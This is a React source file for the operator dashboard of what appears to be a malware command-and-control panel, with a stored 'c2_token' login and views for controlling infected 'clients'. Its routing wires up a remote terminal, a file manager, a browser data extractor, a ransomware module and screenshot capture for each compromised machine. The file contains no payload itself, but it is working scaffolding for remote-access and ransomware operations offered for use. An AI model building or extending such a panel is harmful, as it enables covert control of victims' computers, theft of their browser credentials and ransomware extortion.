import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

import Header from './components/Header';
import Login from './components/Login';
import Sidebar from './components/Sidebar';
import Dashboard from './components/Dashboard';
import Clients from './components/Clients';
import Terminal from './components/Terminal';
import FileManager from './components/FileManager';
import BrowserExtractor from './components/BrowserExtractor';
import Ransomware from './components/Ransomware';
import Screenshots from './components/Screenshots';
import Settings from './components/Settings';

import { useSocket } from './hooks/useSocket';
import { useClients } from './hooks/useClients';

function App() {
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [currentView, setCurrentView] = useState('dashboard');
  const [selectedClient, setSelectedClient] = useState(null);
  const [token, setToken] = useState(() => localStorage.getItem('c2_token') || '');

  const socket = useSocket(token);
  const { clients, loading, error } = useClients(socket);

  const toggleSidebar = () => {
    setSidebarOpen(!sidebarOpen);
  };

  const handleClientSelect = (client) => {
    setSelectedClient(client);
    setCurrentView('terminal');
  };

  const renderCurrentView = () => {
    switch (currentView) {
      case 'dashboard':
        return <Dashboard clients={clients} onClientSelect={handleClientSelect} />;
      case 'clients':
        return <Clients 
          clients={clients} 
          onClientSelect={(client) => {
            setSelectedClient(client);
            setCurrentView('files');
          }}
          onDeleteClient={(clientId) => {
            try {
              if (socket && typeof socket.emit === 'function') {
                socket.emit('deleteClient', { clientId });
              }
            } catch (e) {}
          }}
        />;
      case 'terminal':
        return <Terminal client={selectedClient} socket={socket} />;
      case 'files':
        return <FileManager client={selectedClient} socket={socket} />;
      case 'browser':
        return <BrowserExtractor client={selectedClient} socket={socket} />;
      case 'ransomware':
        return <Ransomware client={selectedClient} socket={socket} />;
      case 'screenshots':
        return <Screenshots client={selectedClient} socket={socket} />;
      case 'settings':
        return <Settings />;
      default:
        return <Dashboard clients={clients} onClientSelect={handleClientSelect} />;
    }
  };

  if (!token) {
    return <Login onLoggedIn={(t) => setToken(t)} />;
  }

  return (
    <Router>
      <div className="App">
        <Header 
          onToggleSidebar={toggleSidebar}
          sidebarOpen={sidebarOpen}
          currentView={currentView}
          selectedClient={selectedClient}
          onLogout={() => {
            try { localStorage.removeItem('c2_token'); } catch (e) {}
            setToken('');
          }}
        />
        
        <div className="main-content" style={{ display: 'flex', height: 'calc(100vh - 60px)', marginTop: '60px' }}>
          <Sidebar 
            open={sidebarOpen}
            currentView={currentView}
            onViewChange={setCurrentView}
            clients={clients}
            onClientSelect={handleClientSelect}
          />
          
          <main 
            className="content-area"
            style={{
              flex: 1,
              padding: '20px',
              overflow: 'auto',
              backgroundColor: '#0a0a0a',
              transition: 'margin-left 0.3s ease',
              marginLeft: sidebarOpen ? 280 : 0
            }}
          >
            {renderCurrentView()}
          </main>
        </div>

        <ToastContainer
          position="top-right"
          autoClose={5000}
          hideProgressBar={false}
          newestOnTop={false}
          closeOnClick
          rtl={false}
          pauseOnFocusLoss
          draggable
          pauseOnHover
          theme="dark"
        />
      </div>
    </Router>
  );
}

export default App;